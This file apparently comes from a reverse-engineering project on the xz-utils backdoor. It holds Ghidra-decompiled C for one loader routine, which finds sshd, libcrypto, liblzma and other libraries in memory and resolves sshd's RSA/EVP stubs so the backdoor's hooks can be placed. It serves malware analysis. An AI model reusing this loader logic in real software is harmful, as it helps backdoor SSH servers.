// /home/kali/xzre-ghidra/xzregh/104660_process_shared_libraries_map.c
// Function: process_shared_libraries_map @ 0x104660
// Calling convention: unknown
// Prototype: undefined process_shared_libraries_map(void)


/*
 * AutoDoc: Traverses the `r_debug` chain looking for entries whose basename hashes to sshd, libcrypto,
 * ld.so, liblzma, libc, and libsystemd. For each match it verifies the map is sane
 * (non-overlapping, dyn pointer matches the parsed ELF) and, once all handles are collected,
 * resolves the RSA/EVP PLT stubs in sshd and primes the liblzma data segment pointer that holds
 * the hooks blob. The resulting pointers populate `backdoor_shared_libraries_data_t` for the
 * rest of the loader.
 */
#include "xzre_types.h"


bool process_shared_libraries_map(ulong *param_1,long *param_2)

{
  char cVar1;
  long lVar2;
  undefined8 *puVar3;
  undefined8 *puVar4;
  undefined8 *puVar5;
  long *plVar6;
  uint uVar7;
  int iVar8;
  long lVar9;
  ulong *puVar10;
  char *pcVar11;
  char *pcVar12;
  Elf64_Sym *rtld_global_sym;
  char *basename;
  ulong link_map_cursor;
  
  if (param_1 == (ulong *)0x0) {
    return FALSE;
  }
  lVar9 = elf_symbol_get(*(undefined8 *)(param_2[1] + 8),0x5b8,0);
  if (lVar9 == 0) {
    return FALSE;
  }
  do {
    if (param_1[3] == 0) {
      plVar6 = (long *)*param_2;
      if (*plVar6 == 0) {
        return FALSE;
      }
      if (plVar6[3] == 0) {
        return FALSE;
      }
      if (plVar6[1] == 0) {
        return FALSE;
      }
      if (plVar6[4] == 0) {
        return FALSE;
      }
      if (plVar6[2] == 0) {
        return FALSE;
      }
      if (plVar6[5] == 0) {
        return FALSE;
      }
      break;
    }
    if (*param_1 == 0) {
      return FALSE;
    }
    pcVar11 = (char *)param_1[1];
    if (pcVar11 == (char *)0x0) {
      return FALSE;
    }
    if (param_1[2] == 0) {
      return FALSE;
    }
    pcVar12 = pcVar11;
    if (*pcVar11 == '\0') {
      if (*(long *)*param_2 != 0) {
        return FALSE;
      }
      *(long *)*param_2 = (long)param_1;
    }
    else {
      while (cVar1 = *pcVar11, cVar1 != '\0') {
        pcVar11 = pcVar11 + 1;
        if (cVar1 == '/') {
          pcVar12 = pcVar11;
        }
      }
      uVar7 = get_string_id(pcVar12);
      lVar2 = *param_2;
      if (uVar7 == 2000) {
        if (*(long *)(lVar2 + 0x28) != 0) {
          return FALSE;
        }
        *(ulong **)(lVar2 + 0x28) = param_1;
      }
      else if (uVar7 < 0x7d1) {
        if (uVar7 == 0x590) {
          if (*(long *)(lVar2 + 0x10) != 0) {
            return FALSE;
          }
          if (0x10465f < *param_1) {
            return FALSE;
          }
          if ((code *)(*param_1 + 0x400000) < process_shared_libraries_map) {
            return FALSE;
          }
          if (param_1[3] == 0) {
            return FALSE;
          }
          *(ulong **)(lVar2 + 0x10) = param_1;
        }
        else if (uVar7 == 0x7c0) {
          if (*(long *)(lVar2 + 0x18) != 0) {
            return FALSE;
          }
          *(ulong **)(lVar2 + 0x18) = param_1;
        }
      }
      else if (uVar7 == 0x938) {
        if (*(long *)(lVar2 + 0x20) != 0) {
          return FALSE;
        }
        *(ulong **)(lVar2 + 0x20) = param_1;
      }
      else if (uVar7 == 0xa48) {
        if (*(long *)(lVar2 + 8) != 0) {
          return FALSE;
        }
        puVar10 = (ulong *)(*(long *)(lVar9 + 8) + **(long **)(param_2[1] + 8));
        if (param_1 <= puVar10) {
          return FALSE;
        }
        if (*(ulong *)(lVar9 + 0x10) < (ulong)((long)param_1 - (long)puVar10)) {
          return FALSE;
        }
        if (param_1[2] != (*(long **)(param_2[1] + 8))[4]) {
          return FALSE;
        }
        *(ulong **)(lVar2 + 8) = param_1;
      }
    }
    plVar6 = (long *)*param_2;
    param_1 = (ulong *)param_1[3];
  } while ((((*plVar6 == 0) || (plVar6[3] == 0)) || (plVar6[1] == 0)) ||
          (((plVar6[4] == 0 || (plVar6[2] == 0)) || (plVar6[5] == 0))));
  puVar3 = (undefined8 *)param_2[4];
  puVar4 = (undefined8 *)param_2[3];
  puVar5 = (undefined8 *)param_2[2];
  lVar9 = *(long *)param_2[1];
  if (*(undefined8 **)*param_2 == (undefined8 *)0x0) {
    return FALSE;
  }
  iVar8 = elf_parse(**(undefined8 **)*param_2,lVar9);
  if (iVar8 == 0) {
    return FALSE;
  }
  if (*(int *)(lVar9 + 0x4c) == 0) {
    return FALSE;
  }
  if ((*(byte *)(lVar9 + 0xd0) & 0x20) == 0) {
    return FALSE;
  }
  puVar10 = (ulong *)elf_get_plt_symbol(lVar9,0x1d0);
  *puVar5 = puVar10;
  if (puVar10 < (ulong *)0x1000000) {
    puVar10 = (ulong *)elf_get_plt_symbol(lVar9,0x510);
    *puVar4 = puVar10;
    if (((ulong *)0xffffff < puVar10) && (0xffffff < *puVar10)) {
      return FALSE;
    }
    puVar10 = (ulong *)elf_get_plt_symbol(lVar9,0x798);
    *puVar3 = puVar10;
    if (puVar10 < (ulong *)0x1000000) goto LAB_00104924;
  }
  if (0xffffff < *puVar10) {
    return FALSE;
  }
LAB_00104924:
  if ((*(undefined8 **)(*param_2 + 0x18) != (undefined8 *)0x0) &&
     (iVar8 = elf_parse(**(undefined8 **)(*param_2 + 0x18)), iVar8 != 0)) {
    plVar6 = (long *)param_2[5];
    link_map_cursor = 0;
    lVar9 = *(long *)(param_2[1] + 0x18);
    if ((*(undefined8 **)(*param_2 + 0x10) != (undefined8 *)0x0) &&
       (((iVar8 = elf_parse(**(undefined8 **)(*param_2 + 0x10),lVar9), iVar8 != 0 &&
         ((*(byte *)(lVar9 + 0xd0) & 0x20) != 0)) &&
        (lVar9 = elf_get_data_segment(lVar9,&link_map_cursor,1), 0x597 < link_map_cursor)))) {
      *plVar6 = lVar9 + 0x10;
      *(ulong *)(lVar9 + 0x590) = link_map_cursor - 0x598;
      if ((*(undefined8 **)(*param_2 + 0x28) != (undefined8 *)0x0) &&
         (iVar8 = elf_parse(**(undefined8 **)(*param_2 + 0x28),*(undefined8 *)(param_2[1] + 0x10)),
         iVar8 != 0)) {
        iVar8 = resolve_libc_imports
                          (*(undefined8 *)(*param_2 + 0x28),*(undefined8 *)(param_2[1] + 0x10),
                           param_2[6]);
        return iVar8 != 0;
      }
    }
  }
  return FALSE;
}

